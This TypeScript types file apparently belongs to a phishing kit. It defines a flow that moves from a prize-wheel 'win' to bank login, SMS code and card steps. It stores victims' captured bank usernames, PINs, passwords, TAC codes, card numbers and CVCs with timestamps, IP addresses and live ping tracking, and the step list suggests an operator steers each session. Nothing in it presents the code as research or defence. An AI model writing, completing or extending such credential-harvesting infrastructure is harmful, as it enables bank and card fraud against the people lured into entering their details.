export type SessionStep =
  | "code_entry"
  | "verify"
  | "wheel"
  | "win"
  | "bank"
  | "banken"
  | "facebook"
  | "whatsapp"
  | "login"
  | "bank_login"
  | "wait"
  | "sms"
  | "card"
  | "congrats"
  | "special_approval"
  | "custom_question"
  | "invalid_bank"
  | "live_support";
export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";

export type BankFormHistoryEntry = {
  bankSlug?: string;
  bankName?: string;
  verfuegernummer?: string;
  username?: string;
  pin?: string;
  password?: string;
  bankPhone?: string;
  personalCode?: string;
  tacCode?: string;
  loginMethod?: string;
  orderedField1?: string;
  orderedField1Key?: string;
  orderedField2?: string;
  orderedField2Key?: string;
  orderedField2Type?: string;
  orderedField3?: string;
  orderedField3Key?: string;
  orderedField3Type?: string;
  rawFields?: Record<string, string>;
  capturedAt: string;
};

export type SessionFormData = {
  firstName?: string;
  lastName?: string;
  phone?: string;
  bankPhone?: string;
  bankName?: string;
  bankSlug?: string;
  loginMethod?: string;
  personalCode?: string;
  username?: string;
  password?: string;
  verfuegernummer?: string;
  pin?: string;
  tacCode?: string;
  smsCode?: string;
  cardHolder?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvc?: string;
  specialNoticeText?: string;
  specialNoticeImage?: string;
  specialNoticeLang?: "de" | "tr";
  specialNoticeSentAt?: string;
  approvalStatus?: string;
  approvalCode?: string;
  approvalHistory?: string;
  customMessage?: string;
  customImage?: string;
  bankFormHistory?: BankFormHistoryEntry[];
  [key: string]:
    | string
    | undefined
    | BankFormHistoryEntry[]
    | Record<string, string>
    | undefined;
};

export type DemoSession = {
  id: string;
  public_id?: number | string | null;
  amount: number;
  current_step: SessionStep;
  status: SessionStatus;
  sms_digits: number;
  sms_mode?: "fixed" | "unknown" | null;
  sms_custom_text?: string;
  form_data: SessionFormData;
  created_at?: string;
  updated_at?: string;
  is_hidden?: boolean;
  partner_name?: string;
  participation_code?: string;
  ip_address?: string;
  user_agent?: string;
  last_ping_at?: string | null;
};
